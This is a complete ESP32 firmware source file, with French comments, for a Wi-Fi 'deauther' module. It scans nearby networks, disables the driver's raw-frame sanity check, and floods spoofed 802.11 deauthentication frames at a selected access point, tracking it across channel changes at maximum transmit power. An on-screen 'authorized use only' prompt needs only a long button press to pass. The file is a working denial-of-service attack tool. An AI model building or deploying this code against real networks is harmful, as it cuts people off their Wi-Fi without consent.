// ---------------------------------------------------------------------------
//  deauther.cpp — émission de trames 802.11 deauth (test de résilience Wi-Fi).
//
//  Logique de scan / sélection / injection reprise telle quelle du code
//  fourni. Modifications pour l'intégration GHOSTBOARD, toutes commentées
//  « [GB] » ci-dessous :
//    [GB] gate d'autorisation avant la PREMIÈRE émission (appui long RIGHT) ;
//    [GB] correction d'un dépassement de tableau (deauth_frame[26] -> [24]) ;
//    [GB] SSID de l'AP unifié (le rebuild utilisait un nom différent) ;
//    [GB] deautherLoop() renvoie true (LEFT sur la liste) pour rendre la main ;
//    [GB] état réinitialisé à chaque entrée ; couleurs LED de la charte.
// ---------------------------------------------------------------------------
#include "config.h"
#include "theme.h"
#include "deauther.h"

namespace Deauther {

// [GB] SSID de l'AP de service, utilisé de façon cohérente partout (le code
//      d'origine reconstruisait la config avec un nom différent au channel-hop).
static const char *AP_SSID = "ESP32DIV";
static const char *AP_PASS = "deauth123";

// [GB] Durée de maintien de RIGHT pour confirmer l'autorisation.
static const unsigned long AUTH_HOLD_MS = 1500;

const int networks_per_page = 5;
int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
bool isScanComplete = false;

// [GB] État du gate d'autorisation.
bool authorized = false;        // l'utilisateur a confirmé pour cette session de module
bool authGate = false;          // écran de confirmation affiché
unsigned long authHoldStart = 0;

unsigned long lastButtonPress = 0;
unsigned long lastRightButtonPress = 0;
const unsigned long debounceTime = 200;
const unsigned long rightDebounceTime = 50;

uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,                         // type, subtype c0: deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
    0x00, 0x00,                         // fragment & sequence number
    0x01, 0x00                          // reason code
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
String lastNeoPixelColour = "0";

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
    // [GB] CORRECTION : le tableau fait 26 octets (indices 0..25). Le code
    //      d'origine écrivait à l'index 26, hors limites (comportement
    //      indéfini). Le reason code occupe les octets 24-25 ; on pose donc 24.
    deauth_frame[24] = 7;
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi;
}

void drawScanScreen() {
    u8g2.clearBuffer();
    gbHeader("Wi-Fi Networks");

    if (scanning) {
        u8g2.setFont(u8g2_font_6x10_tr);
        for (int cycle = 0; cycle < 3; cycle++) {
            for (int i = 0; i < 3; i++) {
                u8g2.clearBuffer();
                u8g2.drawStr(0, 10, "Scanning WiFi");
                String dots = "";
                for (int j = 0; j <= i; j++) {
                    dots += ".";
                }
                u8g2.setFont(u8g2_font_6x10_tr);
                u8g2.drawStr(80, 10, dots.c_str());
                setNeoPixelColour("scan");
                u8g2.sendBuffer();
                delay(300);
            }
        }
        if (lastNeoPixelColour != "scan") {
            setNeoPixelColour("scan");
            lastNeoPixelColour = "scan";
        }
        u8g2.sendBuffer();
        return;
    }

    if (network_count == 0) {
        u8g2.drawStr(10, 30, "No networks found.");
    } else {
        u8g2.setFont(u8g2_font_6x10_tr);
        for (int i = 0; i < networks_per_page; i++) {
            int currentNetworkIndex = i + listStartIndex;
            if (currentNetworkIndex >= network_count) break;

            String networkName = String((char*)ap_list[currentNetworkIndex].ssid);
            int rssi = ap_list[currentNetworkIndex].rssi;

            String networkInfo = networkName.substring(0, 7);
            String networkRssi = " | RSSI " + String(rssi);

            if (currentNetworkIndex == currentIndex) {
                u8g2.drawStr(0, 23 + i * 10, ">");
            }
            u8g2.drawStr(10, 23 + i * 10, networkInfo.c_str());
            u8g2.drawStr(50, 23 + i * 10, networkRssi.c_str());
        }
    }

    if (lastNeoPixelColour != "0") {
        setNeoPixelColour("0");
        lastNeoPixelColour = "0";
    }
    u8g2.sendBuffer();
}

bool scanNetworks() {
    scanning = true;
    currentIndex = 0;
    listStartIndex = 0;
    drawScanScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(1);

    network_count = WiFi.scanNetworks();
    if (network_count == 0) {
        scanning = false;
        drawScanScreen();
        isScanComplete = true;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        drawScanScreen();
        isScanComplete = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }
    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
    scanning = false;
    drawScanScreen();
    isScanComplete = true;
    return true;
}

// [GB] Fabrique la config AP à partir d'un canal donné, avec un SSID unique.
static void applyApConfig(uint8_t channel) {
    wifi_config_t ap_config = {};
    strncpy((char*)ap_config.ap.ssid, AP_SSID, sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen(AP_SSID);
    strncpy((char*)ap_config.ap.password, AP_PASS, sizeof(ap_config.ap.password));
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;
    if (channel) ap_config.ap.channel = channel;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

// [GB] Écran de confirmation d'autorisation, affiché avant la première
//      émission. L'attaque ne démarre qu'après un appui long sur RIGHT.
void drawAuthGate() {
    u8g2.clearBuffer();
    setNeoPixelColour("attack");
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "!! DEAUTH — DoS !!");
    u8g2.drawHLine(0, 13, 128);
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 24, "AUTHORIZED USE ONLY.");
    u8g2.drawStr(0, 33, "Own network or written");
    u8g2.drawStr(0, 42, "permission required.");
    u8g2.drawStr(0, 55, "HOLD RIGHT = confirm");
    u8g2.drawStr(0, 63, "LEFT = cancel");
    u8g2.sendBuffer();
}

void drawAttackScreen(bool fullRedraw = true) {
    if (fullRedraw) {
        u8g2.clearBuffer();
        gbHeader("Network Details");
        u8g2.setFont(u8g2_font_5x8_tr);

        static String name = "";
        static String authStr = "";
        if (!isDetailView) {
            name = "";
            authStr = "";
        } else if (name.isEmpty()) {
            name = "SSID: " + String((char*)selectedAp.ssid).substring(0, 15);
            String auth;
            switch (selectedAp.authmode) {
                case WIFI_AUTH_OPEN: auth = "OPEN"; break;
                case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
                case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2"; break;
                default: auth = "Unknown"; break;
            }
            authStr = "Auth: " + auth;
        }

        u8g2.drawStr(0, 24, name.c_str());
        u8g2.drawStr(0, 32, authStr.c_str());
    } else {
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, 34, 128, 8);
        u8g2.drawBox(0, 42, 128, 8);
        u8g2.setDrawColor(1);
    }

    String status = "Status: " + String(attack_running ? "Running" : "Stopped");
    String packets = "Pkts: " + String(packet_count);
    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    String success = "Succ: " + String(success_rate, 0) + "%";

    u8g2.drawStr(0, 42, status.c_str());
    u8g2.drawStr(84, 42, packets.c_str());
    u8g2.drawStr(0, 50, success.c_str());
    u8g2.drawStr(0, 63, attack_running ? "RIGHT: stop  LEFT: back" : "RIGHT: start  LEFT: back");

    setNeoPixelColour(attack_running ? "attack" : "0");
    u8g2.sendBuffer();
}

void handleButtons() {
    unsigned long currentMillis = millis();

    if (digitalRead(BTN_PIN_RIGHT) == LOW && currentMillis - lastRightButtonPress >= rightDebounceTime && !scanning) {
        lastRightButtonPress = currentMillis;

        delayMicroseconds(400);
        if (digitalRead(BTN_PIN_RIGHT) != LOW) return;

        if (!isDetailView && network_count > 0) {
            isDetailView = true;
            selectedAp = ap_list[currentIndex];
            selectedChannel = ap_list[currentIndex].primary;
            drawAttackScreen();
            while (digitalRead(BTN_PIN_RIGHT) == LOW);
        } else if (isDetailView) {
            if (attack_running) {
                // [GB] Arrêt : jamais gaté.
                attack_running = false;
                last_packet_time = 0;
                esp_wifi_stop();
                drawAttackScreen(false);
                while (digitalRead(BTN_PIN_RIGHT) == LOW);
            } else if (!authorized) {
                // [GB] Démarrage non encore autorisé : on ouvre le gate au lieu
                //      d'émettre. La boucle gère l'appui long de confirmation.
                authGate = true;
                authHoldStart = 0;
                drawAuthGate();
                // Pas de busy-wait ici : la boucle doit voir le maintien.
            } else {
                // [GB] Déjà autorisé pour cette session : démarrage direct.
                attack_running = true;
                esp_wifi_start();
                drawAttackScreen(false);
                while (digitalRead(BTN_PIN_RIGHT) == LOW);
            }
        }
    }

    if (currentMillis - lastButtonPress < debounceTime || scanning) return;

    if (digitalRead(BUTTON_UP_PIN) == LOW) {
        if (!isDetailView && currentIndex > 0) {
            currentIndex--;
            if (currentIndex < listStartIndex) {
                listStartIndex--;
            }
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BUTTON_UP_PIN) == LOW);
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
        if (!isDetailView && currentIndex < network_count - 1) {
            currentIndex++;
            if (currentIndex >= listStartIndex + networks_per_page) {
                listStartIndex++;
            }
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BUTTON_DOWN_PIN) == LOW);
    }
    // NB : LEFT est traité dans deautherLoop (retour liste / retour menu).
}

void deautherSetup() {
    u8g2.setFont(u8g2_font_6x10_tr);

    // [GB] Ré-entrée depuis le menu : état repropre, autorisation redemandée.
    isDetailView = false;
    attack_running = false;
    authorized = false;
    authGate = false;
    authHoldStart = 0;
    currentIndex = 0;
    listStartIndex = 0;
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;

    setNeoPixelColour("0");
    lastNeoPixelColour = "0";

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    // NB (intégration) : cette séquence esp_wifi_init/start est celle du code
    // d'origine, pensée pour un firmware autonome. En ré-entrée depuis un autre
    // module qui a déjà initialisé le driver Wi-Fi, esp_wifi_init peut renvoyer
    // une erreur (ESP_ERROR_CHECK abort). À vérifier sur la carte réelle ; si
    // besoin, faire un esp_wifi_deinit() au retour menu (voir README).
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(82));
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    applyApConfig(0);   // [GB] SSID unifié

    scan_StartTime = millis();
    isScanComplete = false;
    scanNetworks();
}

bool deautherLoop() {
    unsigned long currentMillis = millis();

    // [GB] Gate d'autorisation : rien n'est émis tant qu'il n'est pas confirmé.
    if (authGate) {
        if (digitalRead(BTN_PIN_LEFT) == LOW) {          // annulation
            authGate = false;
            authHoldStart = 0;
            drawAttackScreen();
            while (digitalRead(BTN_PIN_LEFT) == LOW);
        } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {  // maintien = confirmation
            if (authHoldStart == 0) authHoldStart = currentMillis;
            if (currentMillis - authHoldStart >= AUTH_HOLD_MS) {
                authorized = true;
                authGate = false;
                authHoldStart = 0;
                attack_running = true;
                esp_wifi_start();
                drawAttackScreen();
                while (digitalRead(BTN_PIN_RIGHT) == LOW);
            }
        } else {
            authHoldStart = 0;   // relâché trop tôt : le compteur repart de zéro
        }
        return false;
    }

    handleButtons();

    // [GB] LEFT : en détail -> retour liste (+ stop) ; sur la liste -> menu.
    if (currentMillis - lastButtonPress >= debounceTime && digitalRead(BTN_PIN_LEFT) == LOW) {
        lastButtonPress = currentMillis;
        if (isDetailView) {
            attack_running = false;
            last_packet_time = 0;
            esp_wifi_stop();
            isDetailView = false;
            drawScanScreen();
            while (digitalRead(BTN_PIN_LEFT) == LOW);
        } else {
            // Retour au menu : on laisse le Wi-Fi dans un état connu.
            attack_running = false;
            esp_wifi_stop();
            WiFi.mode(WIFI_OFF);
            setNeoPixelColour("0");
            while (digitalRead(BTN_PIN_LEFT) == LOW);
            return true;
        }
    }

    if (!isScanComplete && currentMillis - scan_StartTime < scanTimeout) {
        if (WiFi.scanComplete() >= 0) {
            isScanComplete = true;
            drawScanScreen();
        }
    }

    if (attack_running && isDetailView) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0;
            esp_wifi_stop();
            drawAttackScreen();
            delay(3000);
            return false;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            drawAttackScreen();
            delay(3000);
            return false;
        }

        if (currentMillis - last_packet_time >= 100) {
            wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
            last_packet_time = currentMillis;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && currentMillis - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                applyApConfig(selectedChannel);   // [GB] SSID unifié (le rebuild d'origine en changeait)
            }
        }
        last_channel_check = currentMillis;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && currentMillis - last_status_time > 2000) {
        drawAttackScreen(false);
        last_status_time = currentMillis;
    }

    return false;
}

}  // namespace Deauther
